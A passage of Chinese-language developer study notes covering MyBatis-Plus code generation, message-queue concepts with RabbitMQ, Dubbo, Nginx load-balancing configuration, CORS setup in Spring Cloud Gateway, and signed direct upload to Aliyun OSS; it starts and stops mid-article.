<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-generator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.1.tmp<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- generator根据模版生成 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.velocity<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>velocity<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Velocity（默认）、Freemarker、Beetl</p>
<p>2、启动类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.southwind.mybatisplus;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.DbType;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.AutoGenerator;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.DataSourceConfig;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.GlobalConfig;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.PackageConfig;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.StrategyConfig;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.rules.NamingStrategy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//创建generator对象</span></span><br><span class="line">        <span class="type">AutoGenerator</span> <span class="variable">autoGenerator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AutoGenerator</span>();</span><br><span class="line">        <span class="comment">//数据源</span></span><br><span class="line">        <span class="type">DataSourceConfig</span> <span class="variable">dataSourceConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataSourceConfig</span>();</span><br><span class="line">        dataSourceConfig.setDbType(DbType.MYSQL);</span><br><span class="line">        dataSourceConfig.setUrl(<span class="string">&quot;jdbc:mysql://ip:3306/db?useUnicode=true&amp;characterEncoding=UTF-8&quot;</span>);</span><br><span class="line">        dataSourceConfig.setUsername(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        dataSourceConfig.setPassword(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        dataSourceConfig.setDriverName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">        autoGenerator.setDataSource(dataSourceConfig);</span><br><span class="line">        <span class="comment">//全局配置</span></span><br><span class="line">        <span class="type">GlobalConfig</span> <span class="variable">globalConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GlobalConfig</span>();</span><br><span class="line">        globalConfig.setOutputDir(System.getProperty(<span class="string">&quot;user.dir&quot;</span>)+<span class="string">&quot;/src/main/java&quot;</span>);</span><br><span class="line">        globalConfig.setOpen(<span class="literal">false</span>);</span><br><span class="line">        globalConfig.setAuthor(<span class="string">&quot;southwind&quot;</span>);</span><br><span class="line">        globalConfig.setServiceName(<span class="string">&quot;%sService&quot;</span>);</span><br><span class="line">        autoGenerator.setGlobalConfig(globalConfig);</span><br><span class="line">        <span class="comment">//包信息</span></span><br><span class="line">        <span class="type">PackageConfig</span> <span class="variable">packageConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PackageConfig</span>();</span><br><span class="line">        packageConfig.setParent(<span class="string">&quot;com.southwind.mybatisplus&quot;</span>);</span><br><span class="line">        packageConfig.setModuleName(<span class="string">&quot;generator&quot;</span>);</span><br><span class="line">        packageConfig.setController(<span class="string">&quot;controller&quot;</span>);</span><br><span class="line">        packageConfig.setService(<span class="string">&quot;service&quot;</span>);</span><br><span class="line">        packageConfig.setServiceImpl(<span class="string">&quot;service.impl&quot;</span>);</span><br><span class="line">        packageConfig.setMapper(<span class="string">&quot;mapper&quot;</span>);</span><br><span class="line">        packageConfig.setEntity(<span class="string">&quot;entity&quot;</span>);</span><br><span class="line">        autoGenerator.setPackageInfo(packageConfig);</span><br><span class="line">        <span class="comment">//配置策略</span></span><br><span class="line">        <span class="type">StrategyConfig</span> <span class="variable">strategyConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StrategyConfig</span>();</span><br><span class="line">      	</span><br><span class="line">        strategyConfig.setEntityLombokModel(<span class="literal">true</span>);</span><br><span class="line">      	<span class="comment">//生成部分表</span></span><br><span class="line">        strategyConfig.setInclude(<span class="string">&quot;user&quot;</span>,<span class="string">&quot;product&quot;</span>);</span><br><span class="line">        strategyConfig.setNaming(NamingStrategy.underline_to_camel);</span><br><span class="line">        strategyConfig.setColumnNaming(NamingStrategy.underline_to_camel);</span><br><span class="line">        autoGenerator.setStrategy(strategyConfig);</span><br><span class="line"></span><br><span class="line">        autoGenerator.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="Spring-Boot-MyBatis-Plus-打包应用，直接发布-阿里云-上云"><a href="#Spring-Boot-MyBatis-Plus-打包应用，直接发布-阿里云-上云" class="headerlink" title="Spring Boot + MyBatis Plus 打包应用，直接发布 阿里云 上云"></a>Spring Boot + MyBatis Plus 打包应用，直接发布 阿里云 上云</h3><h2 id="Mybatis-plus-使用mysql关键字做表名"><a href="#Mybatis-plus-使用mysql关键字做表名" class="headerlink" title="Mybatis-plus 使用mysql关键字做表名"></a>Mybatis-plus 使用mysql关键字做表名</h2><p>方法一:改表名</p>
<p>方法二:给实体类打上@TableName注解,加上反引号即可</p>
<h1 id="RabbitMQ理解"><a href="#RabbitMQ理解" class="headerlink" title="RabbitMQ理解"></a>RabbitMQ理解</h1><h2 id="消息队列使用场景"><a href="#消息队列使用场景" class="headerlink" title="消息队列使用场景"></a>消息队列使用场景</h2><p>小红是小明的姐姐。</p>
<p>小红希望小明多读书,常寻找好书给小明看,之前的方式是这样:小红问小明什么时候有空,把书给小明送去,并亲眼监督小明读完书才走。久而久之,两人都觉得麻烦。</p>
<p>后来的方式改成了:小红对小明说「我放到书架上的书你都要看」,然后小红每次发现不错的书都放到书架上,小明则看到书架上有书就拿下来看。</p>
<p>书架就是一个消息队列,小红是生产者,小明是消费者。</p>
<p>这带来的好处有</p>
<ol>
<li>小红想给小明书的时候,不必问小明什么时候有空,亲手把书交给他了,小红只把书放到书架上就行了。这样小红小明的时间都更自由。</li>
<li>小红相信小明的读书自觉和读书能力,不必亲眼观察小明的读书过程,小红只要做一个放书的动作,很节省时间。</li>
<li>当明天有另一个爱读书的小伙伴小强加入,小红仍旧只需要把书放到书架上,小明和小强从书架上取书即可(唔,姑且设定成多个人取一本书可以每人取走一本吧,可能是拷贝电子书或复印,暂不考虑版权问题)。</li>
<li>书架上的书放在那里,小明阅读速度快就早点看完,阅读速度慢就晚点看完,没关系,比起小红把书递给小明并监督小明读完的方式,小明的压力会小一些。</li>
</ol>
<p>这就是消息队列的四大好处：</p>
<ol>
<li><p>解耦<br>每个成员不必受其他成员影响,可以更独立自主,只通过一个简单的容器来联系。<br>小红甚至可以不知道从书架上取书的是谁,小明也可以不知道往书架上放书的人是谁,在他们眼里,都只有书架,没有对方。    </p>
<p>毫无疑问，与一个简单的容器打交道，比与复杂的人打交道容易一万倍，小红小明可以自由自在的追求各自的人生。         </p>
</li>
<li><p>提速<br>小红选择相信「把书放到书架上,别的我不问」,为自己节省了大量时间。<br>小红很忙,只能抽出五分钟时间,但这时间足够把书放到书架上了。</p>
</li>
<li><p>广播<br>小红只需要劳动一次,就可以让多个小伙伴有书可读,这大大地节省了她的时间,也让新的小伙伴的加入成本很低。</p>
</li>
<li><p>削峰<br>假设小明读书很慢,如果采用小红每给一本书都监督小明读完的方式,小明有压力,小红也不耐烦。<br>反正小红给书的频率也不稳定,如果今明两天连给了五本,之后隔三个月才又给一本,那小明只要在三个月内从书架上陆续取走五本书读完就行了,压力就不那么大了。</p>
</li>
</ol>
<p>当然,使用消息队列也有其成本：</p>
<ol>
<li>引入复杂度<br>毫无疑问,「书架」这东西是多出来的,需要地方放它,还需要防盗。</li>
<li>暂时的不一致性<br>假如妈妈问小红「小明最近读了什么书」,在以前的方式里,小红因为亲眼监督小明读完书了,可以底气十足地告诉妈妈,但新的方式里,小红回答妈妈之后会心想「小明应该会很快看完吧…..」<br>这中间存在着一段「妈妈认为小明看了某书,而小明其实还没看」的时期,当然,小明最终的阅读状态与妈妈的认知会是一致的,这就是所谓的「最终一致性」。</li>
</ol>
<p>那么,该使用消息队列的情况需要满足什么条件呢?</p>
<ol>
<li><p>生产者不需要从消费者处获得反馈</p>
<p>引入消息队列之前的直接调用,其接口的返回值应该为空,这才让明明下层的动作还没做,上层却当成动作做完了继续往后走——即所谓异步——成为了可能。<br>小红放完书之后小明到底看了没有,小红根本不问,她默认他是看了,否则就只能用原来的方法监督到看完了。   </p>
</li>
<li><p>容许短暂的不一致性<br>妈妈可能会发现「有时候据说小明看了某书,但事实上他还没看」,只要妈妈满意于「反正他最后看了就行」,异步处理就没问题。<br>如果妈妈对这情况不能容忍,对小红大发雷霆,小红也就不敢用书架方式了。</p>
</li>
<li><p>确实是用了有效果<br>即解耦、提速、广播、削峰这些方面的收益,超过放置书架、监控书架这些成本。<br>否则如果是盲目照搬,「听说老赵家买了书架,咱们家也买一个」,买回来却没什么用,只是让步骤变多了,还不如直接把书递给对方呢,那就不对了。</p>
</li>
</ol>
<p>个人认为消息队列的主要特点是异步处理，主要目的是减少请求响应时间和解耦。所以主要的使用场景就是将比较耗时而且不需要即时（同步）返回结果的操作作为消息放入消息队列。同时由于使用了消息队列，只要保证消息格式不变，消息的发送方和接收方并不需要彼此联系，也不需要受对方的影响，即解耦和。</p>
<p>使用场景的话，举个例子：<br>假设用户在你的软件中注册，服务端收到用户的注册请求后，它会做这些操作：</p>
<ol>
<li>校验用户名等信息，如果没问题会在数据库中添加一个用户记录</li>
<li>如果是用邮箱注册会给你发送一封注册成功的邮件，手机注册则会发送一条短信</li>
<li>分析用户的个人信息，以便将来向他推荐一些志同道合的人，或向那些人推荐他</li>
<li>发送给用户一个包含操作指南的系统通知</li>
<li>等等……</li>
</ol>
<p>但是对于用户来说，注册功能实际只需要第一步，只要服务端将他的账户信息存到数据库中他便可以登录上去做他想做的事情了。至于其他的事情，非要在这一次请求中全部完成么？值得用户浪费时间等你处理这些对他来说无关紧要的事情么？所以实际当第一步做完后，服务端就可以把其他的操作放入对应的消息队列中然后马上返回用户结果，由消息队列异步的进行这些操作。</p>
<p>或者还有一种情况，同时有大量用户注册你的软件，在高并发情况下注册请求开始出现一些问题，例如邮件接口承受不住，或是分析信息时的大量计算使cpu满载，这将会出现虽然用户数据记录很快的添加到数据库中了，但是却卡在发邮件或分析信息时的情况，导致请求的响应时间大幅增长，甚至出现超时，这就有点不划算了。面对这种情况一般也是将这些操作放入消息队列（生产者消费者模型），消息队列慢慢的进行处理，同时可以很快的完成注册请求，不会影响用户使用其他功能。</p>
<p>所以在软件的正常功能开发中，并不需要去刻意的寻找消息队列的使用场景，而是当出现性能瓶颈时，去查看业务逻辑是否存在可以异步处理的耗时操作，如果存在的话便可以引入消息队列来解决。否则盲目的使用消息队列可能会增加维护和开发的成本却无法得到可观的性能提升，那就得不偿失了。</p>
<h2 id="AMQP"><a href="#AMQP" class="headerlink" title="AMQP"></a>AMQP</h2><p>一个提供统一消息服务的应用层标准高级消息队列协议，是一个通用的应用层协议。</p>
<p>消息发送与接收的双方遵守这个协议可以实现异步通讯。这个协议约定了消息的格式和工作方式。</p>
<h2 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h2><p>RabbitMq是一个实现了AMQP(Advanced Message Queuing Protocol)高级消息队列协议的消息队列服务，用Erlang语言编写的。</p>
<h1 id="Dubbo"><a href="#Dubbo" class="headerlink" title="Dubbo"></a>Dubbo</h1><p>dubbo本身并不是一个服务软件。它其实就是一个jar包能够帮你的java程序连接到zookeeper，并利用zookeeper消费、提供服务。所以你不用在Linux上启动什么dubbo服务。</p>
<h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><h2 id="反向代理原理"><a href="#反向代理原理" class="headerlink" title="反向代理原理"></a>反向代理原理</h2><p>什么是反向代理？</p>
<ul>
<li>代理：通过客户机的配置，实现让一台服务器代理客户机，客户的所有请求都交给代理服务器处理。</li>
<li>反向代理：用一台服务器，代理真实服务器，用户访问时，不再是访问真实服务器，而是代理服务器。</li>
</ul>
<p>nginx可以当做反向代理服务器来使用：</p>
<ul>
<li>我们需要提前在nginx中配置好反向代理的规则，不同的请求，交给不同的真实服务器处理</li>
<li>当请求到达nginx，nginx会根据已经定义的规则进行请求的转发，从而实现路由功能</li>
</ul>
<p>利用反向代理，就可以解决我们前面所说的端口问题，如图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022654.png" alt="image-20200111175118787"></p>
<h2 id="负载均衡（了解）"><a href="#负载均衡（了解）" class="headerlink" title="负载均衡（了解）"></a>负载均衡（了解）</h2><p>我们的nginx反向代理，目标服务器地址是通过IP和Port来指定，那么新的问题来了：</p>
<p>如果我们的<code>leyou-manage</code>不是单节点，而是一个服务集群，如图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022655.png" alt="image-20200113094533555"></p>
<h3 id="负载均衡轮询策略"><a href="#负载均衡轮询策略" class="headerlink" title="负载均衡轮询策略"></a>负载均衡轮询策略</h3><p>首先定义负载均衡的集群节点信息，及负载均衡的策略，默认策略是轮询，顾名思义，所有请求都按照时间顺序分配到不同的服务上，如果服务Down掉，可以自动剔除，本例中配置四个节点轮询：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 负载均衡配置，默认是轮询</span></span><br><span class="line"><span class="section">upstream</span> leyou-manage&#123;</span><br><span class="line">	<span class="attribute">server</span>	<span class="number">127.0.0.1:9001</span>; <span class="comment"># 节点信息</span></span><br><span class="line">    <span class="attribute">server</span>	<span class="number">127.0.0.1:9002</span>; <span class="comment"># 节点信息</span></span><br><span class="line">    <span class="attribute">server</span>	<span class="number">127.0.0.1:9003</span>; <span class="comment"># 节点信息</span></span><br><span class="line">    <span class="attribute">server</span>	<span class="number">127.0.0.1:9004</span>; <span class="comment"># 节点信息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后在反向代理时不要指向具体IP，而是这里配置的：<code>leyou-manage</code>。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">	<span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">	<span class="attribute">server_name</span>  manage.leyou.com;</span><br><span class="line">	</span><br><span class="line">	<span class="section">location</span> / &#123;</span><br><span class="line">	    <span class="attribute">proxy_pass</span>   http://leyou-manage;</span><br><span class="line">		<span class="attribute">proxy_connect_timeout</span> <span class="number">600</span>;</span><br><span class="line">		<span class="attribute">proxy_read_timeout</span> <span class="number">5000</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="加权轮询"><a href="#加权轮询" class="headerlink" title="加权轮询"></a>加权轮询</h3><p>指定每个服务的权重比例，weight和访问比率成正比，通常用于后端服务机器性能不统一，将性能好的分配权重高来发挥服务器最大性能，如下配置后9001服务的访问比率会是9002服务的二倍。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 负载均衡配置，默认是轮询</span></span><br><span class="line"><span class="section">upstream</span> leyou-manage&#123;</span><br><span class="line">	<span class="attribute">server</span>	<span class="number">127.0.0.1:9001</span> weight=<span class="number">1</span>; <span class="comment"># 节点信息</span></span><br><span class="line">    <span class="attribute">server</span>	<span class="number">127.0.0.1:9002</span> weight=<span class="number">2</span>; <span class="comment"># 节点信息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="IP哈希"><a href="#IP哈希" class="headerlink" title="IP哈希"></a>IP哈希</h3><p>每个请求都根据访问ip的hash结果分配，经过这样的处理，每个访客固定访问一个后端服务</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">upstream</span>  leyou-manage &#123;</span><br><span class="line">    ip_hash; </span><br><span class="line">	<span class="attribute">server</span>	<span class="number">127.0.0.1:9001</span>; <span class="comment"># 节点信息</span></span><br><span class="line">    <span class="attribute">server</span>	<span class="number">127.0.0.1:9002</span>; <span class="comment"># 节点信息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="最少连接"><a href="#最少连接" class="headerlink" title="最少连接"></a>最少连接</h3><p>将请求分配到连接数最少的服务上。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">upstream</span> leyou-manage&#123;</span><br><span class="line">    least_conn;</span><br><span class="line">	<span class="attribute">server</span>	<span class="number">127.0.0.1:9001</span>; <span class="comment"># 节点信息</span></span><br><span class="line">    <span class="attribute">server</span>	<span class="number">127.0.0.1:9002</span>; <span class="comment"># 节点信息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="作为图片服务器"><a href="#作为图片服务器" class="headerlink" title="作为图片服务器"></a>作为图片服务器</h2><p>将images放入html目录下,通过images.leyou.com访问图片服务器,可以通过配置开启sendfile系统调用, 零拷贝;</p>
<h1 id="CORS跨域"><a href="#CORS跨域" class="headerlink" title="CORS跨域"></a>CORS跨域</h1><p>跨域是指跨域名的访问，以下情况都属于跨域：</p>
<table>
<thead>
<tr>
<th>跨域原因说明</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>一级或二级域名不同</td>
<td><code>www.jd.com</code> 与 <code>www.taobao.com</code></td>
</tr>
<tr>
<td>域名相同，端口不同</td>
<td><code>www.jd.com:8080</code> 与 <code>www.jd.com:8081</code></td>
</tr>
<tr>
<td>三级域名不同</td>
<td><code>item.jd.com</code> 与 <code>miaosha.jd.com</code></td>
</tr>
</tbody></table>
<p>如果<strong>域名和端口都相同，但是请求路径不同</strong>，不属于跨域，如：</p>
<p><code>www.jd.com/item</code> </p>
<p><code>www.jd.com/goods</code></p>
<p>而我们刚才是从<code>manage.leyou.com</code>去访问<code>api.leyou.com</code>，这属于二级域名不同，跨域了。</p>
<h2 id="为什么有跨域问题？"><a href="#为什么有跨域问题？" class="headerlink" title="为什么有跨域问题？"></a>为什么有跨域问题？</h2><p>跨域不一定会有跨域问题。</p>
<p>因为跨域问题是浏览器对于ajax请求的一种安全限制：<strong>一个页面发起的ajax请求，只能是于当前页同域名的路径</strong>，这能有效的阻止跨站攻击(XSS)。(利用ajax发送cookie)</p>
<p>因此：<strong>跨域问题是针对ajax的一种限制</strong>。</p>
<p>但是这却给我们的开发带来了不变，而且在实际生成环境中，肯定会有很多台服务器之间交互，地址和端口都可能不同，怎么办？</p>
<h2 id="解决跨域问题的方案"><a href="#解决跨域问题的方案" class="headerlink" title="解决跨域问题的方案"></a>解决跨域问题的方案</h2><p>浏览器虽然会限制跨域请求，但是也给出了解决方案。如果你确实需要发送跨域的ajax，必须通过被访问的服务端同意才可以。浏览器与服务器间协商是否允许跨域，这样的方式就是CORS。</p>
<p>参考文档：<a href="https://www.ruanyifeng.com/blog/2016/04/cors.html">https://www.ruanyifeng.com/blog/2016/04/cors.html</a></p>
<h2 id="CORS介绍"><a href="#CORS介绍" class="headerlink" title="CORS介绍"></a>CORS介绍</h2><p>CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing）。</p>
<p>它允许浏览器向跨源服务器，发出<a href="http://www.ruanyifeng.com/blog/2012/09/xmlhttprequest_level_2.html"><code>XMLHttpRequest</code></a>请求，从而克服了AJAX只能<a href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html">同源</a>使用的限制。</p>
<p>CORS需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE浏览器不能低于IE10。</p>
<ul>
<li><p>浏览器端：</p>
<p>目前，所有浏览器都支持该功能（IE10以下不行）。整个CORS通信过程，都是浏览器自动完成，不需要用户参与。浏览器会在发出ajax时询问服务端是否允许当前网站的跨域请求，并根据服务端响应做出拦截或放行的处理。</p>
</li>
<li><p>服务端：</p>
<p>CORS通信与AJAX没有任何差别，因此你不需要改变以前的业务逻辑。只不过，浏览器会在请求中携带一些头信息，表明请求者的身份。服务端接收到以后，需要对这些信息做出判断，如果允许则需要在返回的头信息中携带一些许可的声明。</p>
</li>
</ul>
<h2 id="SpringCloudGateway的CORS"><a href="#SpringCloudGateway的CORS" class="headerlink" title="SpringCloudGateway的CORS"></a>SpringCloudGateway的CORS</h2><p>在SpringCloudGateway中，已经提供了默认的CORS实现，我们只需要通过application.yml做简单配置即可。我们在<code>ly-gateway</code>中的<code>application.yml</code>中添加一些配置：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="attr">default-filters:</span> <span class="comment"># 默认过滤项</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Hystrix</span> <span class="comment"># 指定过滤工厂名称（可以是任意过滤工厂类型）</span></span><br><span class="line">        <span class="attr">args:</span> <span class="comment"># 指定过滤的参数</span></span><br><span class="line">          <span class="attr">name:</span> <span class="string">fallbackcmd</span>  <span class="comment"># hystrix的指令名</span></span><br><span class="line">          <span class="attr">fallbackUri:</span> <span class="string">forward:/hystrix/fallback</span> <span class="comment"># 失败后的跳转路径</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">StripPrefix=1</span> <span class="comment"># 去除路由前缀</span></span><br><span class="line">      <span class="attr">globalcors:</span> <span class="comment"># 全局的跨域处理</span></span><br><span class="line">        <span class="attr">add-to-simple-url-handler-mapping:</span> <span class="literal">true</span> <span class="comment"># 是否将当前cors配置加入到SimpleUrlHandlerMapping中，解决options请求被拦截问题</span></span><br><span class="line">        <span class="attr">corsConfigurations:</span></span><br><span class="line">          <span class="string">&#x27;[/**]&#x27;</span><span class="string">:</span></span><br><span class="line">            <span class="attr">allowedOrigins:</span> <span class="comment"># 允许哪些网站的跨域请求</span></span><br><span class="line">              <span class="bullet">-</span> <span class="string">&quot;http://manage.leyou.com&quot;</span></span><br><span class="line">              <span class="bullet">-</span> <span class="string">&quot;http://www.leyou.com&quot;</span></span><br><span class="line">            <span class="attr">allowedMethods:</span> <span class="comment"># 允许的跨域ajax的请求方式</span></span><br><span class="line">              <span class="bullet">-</span> <span class="string">&quot;GET&quot;</span></span><br><span class="line">              <span class="bullet">-</span> <span class="string">&quot;POST&quot;</span></span><br><span class="line">              <span class="bullet">-</span> <span class="string">&quot;DELETE&quot;</span></span><br><span class="line">              <span class="bullet">-</span> <span class="string">&quot;PUT&quot;</span></span><br><span class="line">              <span class="bullet">-</span> <span class="string">&quot;OPTIONS&quot;</span></span><br><span class="line">            <span class="attr">allowedHeaders:</span> <span class="string">&quot;*&quot;</span> <span class="comment"># 允许在请求中携带的头信息</span></span><br><span class="line">            <span class="attr">allowCredentials:</span> <span class="literal">true</span> <span class="comment"># 是否允许携带cookie</span></span><br><span class="line">            <span class="attr">maxAge:</span> <span class="number">360000</span> <span class="comment"># 这次跨域检测的有效期</span></span><br></pre></td></tr></table></figure>

<h1 id="上传文件到OSS"><a href="#上传文件到OSS" class="headerlink" title="上传文件到OSS"></a>上传文件到OSS</h1><h2 id="传统方式"><a href="#传统方式" class="headerlink" title="传统方式"></a>传统方式</h2><p>我们可以直接使用java代码来实现把图片上传到OSS，不过这样以来文件会先从客户端浏览器上传到我们的服务端tomcat，然后再上传到OSS，效率较低，如图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022656.png" alt="1552311281042"></p>
<p>以上方法有三个缺点：</p>
<ul>
<li>上传慢。先上传到应用服务器，再上传到OSS，网络传送比直传到OSS多了一倍。如果直传到OSS，不通过应用服务器，速度将大大提升，而且OSS采用BGP带宽，能保证各地各运营商的速度。</li>
<li>扩展性差。如果后续用户多了，应用服务器会成为瓶颈。</li>
<li>费用高。需要准备多台应用服务器。由于OSS上传流量是免费的，如果数据直传到OSS，不通过应用服务器，那么将能省下几台应用服务器。</li>
</ul>
<h2 id="web前端签名后直传"><a href="#web前端签名后直传" class="headerlink" title="web前端签名后直传"></a>web前端签名后直传</h2><p>客户端通过JavaScript代码完成签名，然后通过表单直传数据到OSS。无需访问应用服务器，对应用服务器压力较低。</p>
<p>流程图如下：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022657.png" alt="image-20200127125730699"></p>
<ul>
<li>JavaScript客户端签名直传：<ul>
<li>优点：在客户端通过JavaScript代码完成签名，无需过多配置，即可实现直传，非常方便。</li>
<li>问题：客户端通过JavaScript把AccesssKeyID 和AccessKeySecret写在代码里面有泄露的风险</li>
</ul>
</li>
</ul>
<h2 id="服务端签名后直传流程"><a href="#服务端签名后直传流程" class="headerlink" title="服务端签名后直传流程"></a>服务端签名后直传流程</h2><p>服务端签名后直传的原理如下：</p>
<ol>
<li>用户发送上传Policy请求到应用服务器（我们的微服务）。</li>
<li>应用服务器返回上传Policy和签名给用户。</li>
<li>用户直接上传数据到OSS。</li>
</ol>
<p>流程图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022658.png" alt="1552311833528"></p>
<ul>
<li>服务端签名，JavaScript客户端直传：<ul>
<li>优点：Web端向服务端请求签名，然后直接上传，不会对服务端产生压力，而且安全可靠</li>
<li>问题：服务端无法实时了解用户上传了多少文件，上传了什么文件</li>
</ul>
</li>
</ul>
<p>在页面点击上传的按钮，可以看到请求已经发出：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022659.png" alt="image-20200127132348077"> </p>
<p>这正是在向服务端申请签名，接下来我们需要在服务端接收请求，生成签名并返回。</p>
<p>我们要做的事情包括：</p>
<ul>
<li>搭建微服务</li>
<li>在微服务中，提供一个接口，生成文件上传需要的签名<ul>
<li>分析接口声明，分析请求方式、请求路径、请求参数、返回值类型</li>
<li>实现业务，生成签名<ul>
<li>把一些常量配置到yml文件</li>
<li>编写类，读取这些属性</li>
<li>把OSS客户端注入到spring容器</li>
<li>编写业务，实现签名的生成</li>
<li>解决跨域问题(在阿里云OSS上设置)</li>
</ul>
</li>
</ul>
</li>
<li>前端，调用我们的接口，获取签名（已完成）</li>
<li>前端，携带签名，完成上传（已完成）</li>
</ul>
<p>签名返回值</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;accessId&quot;</span><span class="punctuation">:</span><span class="string">&quot;6MKO******4AUk44&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;host&quot;</span><span class="punctuation">:</span><span class="string">&quot;http://post-test.oss-cn-hangzhou.aliyuncs.com&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;policy&quot;</span><span class="punctuation">:</span><span class="string">&quot;eyJleHBpcmF0aW9uIjoiMjAxNS0xMS0wNVQyMDo1Mjoy******Jjdb25kaXRpb25zIjpbWyJjdb250ZW50LWxlbmd0aC1yYW5nZSIsMCwxMDQ4NTc2MDAwXSxbInN0YXJ0cy13aXRoIiwiJGtleSIsInVzZXItZGlyXC8iXV19&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;signature&quot;</span><span class="punctuation">:</span><span class="string">&quot;VsxOcOudx******z93CLaXPz+4s=&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;expire&quot;</span><span class="punctuation">:</span><span class="number">1446727949</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;dir&quot;</span><span class="punctuation">:</span><span class="string">&quot;user-dirs/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>详细解释：</p>
<ul>
<li><code>accessId</code>：用户的AccessKeyId</li>
<li><code>host</code>：申请的阿里OSS的bucket访问地址</li>
<li><code>policy</code>：文件上传的策略，主要包含对上传文件的要求，利用Base64加密后返回，<a href="https://help.aliyun.com/document_detail/31988.html?spm=a2c4g.11186623.2.22.58cd7eaer5eXWw#section-d5z-1ww-wdb">说明文档</a></li>
<li><code>signature</code>：生成的签名</li>
<li><code>expire</code>：本次签名的过期时间，客户端可以换成签名，在有效期内无需再次签名</li>
